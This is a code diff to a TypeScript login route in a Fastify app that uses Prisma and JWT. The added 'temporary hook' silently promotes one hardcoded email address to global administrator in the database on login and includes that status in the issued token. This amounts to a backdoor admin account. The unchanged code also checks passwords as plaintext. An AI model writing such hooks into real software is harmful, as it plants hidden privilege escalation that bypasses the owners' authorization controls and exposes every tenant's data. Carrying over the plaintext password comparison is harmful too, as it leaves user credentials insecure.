@@ -51,7 +51,7 @@ export async function authRoutes(app: FastifyInstance) {
     }, async (request, reply) => {
         const { email, password } = request.body as any;
 
-        const user = await prisma.user.findUnique({
+        let user = await prisma.user.findUnique({
             where: { email },
             include: {
                 tenant: {
@@ -62,6 +62,16 @@ export async function authRoutes(app: FastifyInstance) {
 
         if (!user || user.password !== password) {
             return reply.status(401).send({ message: 'Invalid credentials' });
+        }
+
+        // Temporary hook to promote vtvariaty@gmail.com
+        let isAdmin = (user as any).isGlobalAdmin;
+        if (user.email === 'vtvariaty@gmail.com' && !isAdmin) {
+            await prisma.user.update({
+                where: { id: user.id },
+                data: { isGlobalAdmin: true } as any
+            });
+            isAdmin = true;
         }
 
         const token = app.jwt.sign({
@@ -77,8 +87,8 @@ export async function authRoutes(app: FastifyInstance) {
                 name: user.name,
                 email: user.email,
                 tenantId: user.tenantId,
-                isGlobalAdmin: user.isGlobalAdmin,
-                subscriptionStatus: user.tenant.subscription?.status || null
+                isGlobalAdmin: isAdmin,
+                subscriptionStatus: user.tenant?.subscription?.status || null
             }
         };
     });
